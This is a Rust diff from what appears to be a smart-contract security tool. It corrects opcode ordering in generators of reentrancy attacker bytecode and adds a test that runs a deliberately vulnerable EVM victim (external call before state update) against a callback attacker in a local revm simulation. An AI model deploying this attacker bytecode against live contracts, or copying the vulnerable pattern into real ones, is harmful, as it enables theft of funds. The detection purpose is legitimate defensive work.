@@ -283,9 +283,10 @@ pub fn build_callback_reentrant_attacker(
     reenter_calldata: &[u8],
 ) -> Vec<u8> {
     let mut code = Vec::new();
-    // If CALLDATASIZE >= 4 && first 4 bytes == callback_selector -> jump to callback_pc;
-    // else if CALLDATASIZE > 0 -> jump to forwarder_pc; else -> callback_pc (ETH receive).
-    code.extend_from_slice(&[0x36, 0x60, 0x04, 0x10]); // CALLDATASIZE, PUSH1 4, LT (size < 4)
+    // If CALLDATASIZE < 4 -> jump to callback_pc (ETH receive);
+    // else if first 4 bytes == callback_selector -> jump to callback_pc;
+    // else -> forwarder branch.
+    code.extend_from_slice(&[0x60, 0x04, 0x36, 0x10]); // PUSH1 4, CALLDATASIZE, LT (CALLDATASIZE < 4)
     let small_cd_jump_idx = code.len() + 1;
     code.extend_from_slice(&[0x61, 0x00, 0x00, 0x57]); // PUSH2 callback_pc, JUMPI
 
@@ -324,6 +325,7 @@ pub fn build_callback_reentrant_attacker(
         0x55, // DUP1, SSTORE(0)
         0x60,
         max_reentries,
+        0x90, // SWAP1
         0x11, // GT (count > max_reentries)
     ]);
     let ret_jump_idx = code.len() + 1;
@@ -380,7 +382,7 @@ pub fn probe_view_reentrancy_in_revm(
     // - CALLDATASIZE == 1 -> post-tx steady-state probe: STATICCALL VICTIM_ADDR(view_calldata) -> SSTORE(3)
     // - CALLDATASIZE >= 2 -> forward mutator calldata to VICTIM_ADDR
     let mut attacker = Vec::new();
-    attacker.extend_from_slice(&[0x36, 0x60, 0x01, 0x11]); // CALLDATASIZE > 1
+    attacker.extend_from_slice(&[0x60, 0x01, 0x36, 0x11]); // PUSH1 1, CALLDATASIZE, GT (CALLDATASIZE > 1)
     let fwd_jump_idx = attacker.len() + 1;
     attacker.extend_from_slice(&[0x61, 0x00, 0x00, 0x57]); // PUSH2 fwd_pc, JUMPI
 
@@ -793,5 +795,54 @@ mod tests {
         let r_18dec = 1_000_000_000_000_000_000_000_000u128; // 10^24 wei
         let skew_18dec = check_amm_spot_skew_bps(r_18dec, r_18dec, r_18dec / 2);
         assert_eq!(skew_18dec, 5_555);
+    }
+
+    #[test]
+    fn revm_view_reentrancy_oracle_and_callback_attacker_prove_stale_view() {
+        // Minimal EVM victim:
+        // - If first byte of calldata == 0xbb (view): return SLOAD(0) (32 bytes)
+        // - Else (mutator 0xaa...): CALL(msg.sender, value=1 wei) BEFORE SSTORE(0, 42)
+        //   -> During callback, view observes 0; post-tx view observes 42 => PROVEN!
+        let mut victim = Vec::new();
+        victim.extend_from_slice(&[0x60, 0x00, 0x35, 0x60, 0xf8, 0x1c, 0x60, 0xbb, 0x14]); // byte0 == 0xbb
+        let view_jump_idx = victim.len() + 1;
+        victim.extend_from_slice(&[0x61, 0x00, 0x00, 0x57]); // PUSH2 view_pc, JUMPI
+
+        // Mutator: CALL(gas=500_000, addr=CALLER, val=1, 0, 0, 0, 0), POP, SSTORE(0, 42), STOP
+        victim.extend_from_slice(&[
+            0x60, 0x00, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00, // ret/arg=0
+            0x60, 0x01, // value=1 wei
+            0x33, // CALLER
+            0x62, 0x07, 0xa1, 0x20, 0xf1, 0x50, // CALL(500_000), POP
+            0x60, 0x2a, 0x60, 0x00, 0x55, 0x00, // SSTORE(0, 42), STOP
+        ]);
+
+        let view_pc = victim.len() as u16;
+        victim[view_jump_idx..view_jump_idx + 2].copy_from_slice(&view_pc.to_be_bytes());
+        victim.extend_from_slice(&[
+            0x5b, // JUMPDEST (view_pc)
+            0x60, 0x00, 0x54, // SLOAD(0)
+            0x60, 0x00, 0x52, // MSTORE(0)
+            0x60, 0x20, 0x60, 0x00, 0xf3, // RETURN(0, 32)
+        ]);
+
+        let res = probe_view_reentrancy_in_revm(
+            &victim,
+            &[0xaa, 0xaa, 0xaa, 0xaa],
+            &[0xbb, 0xbb, 0xbb, 0xbb],
+        );
+        assert!(res.proven, "revm must PROVE view reentrancy: {res:?}");
+        assert_eq!(res.profit_wei, U256::from(42));
+
+        // Verify callback-aware attacker builds non-empty valid EVM bytecode for onERC721Received
+        let mut magic = [0u8; 32];
+        magic[..4].copy_from_slice(&SEL_ON_ERC721_RECEIVED);
+        let cb_code = build_callback_reentrant_attacker(
+            SEL_ON_ERC721_RECEIVED,
+            magic,
+            2,
+            &[0xaa, 0xaa, 0xaa, 0xaa],
+        );
+        assert!(cb_code.len() > 60);
     }
 }
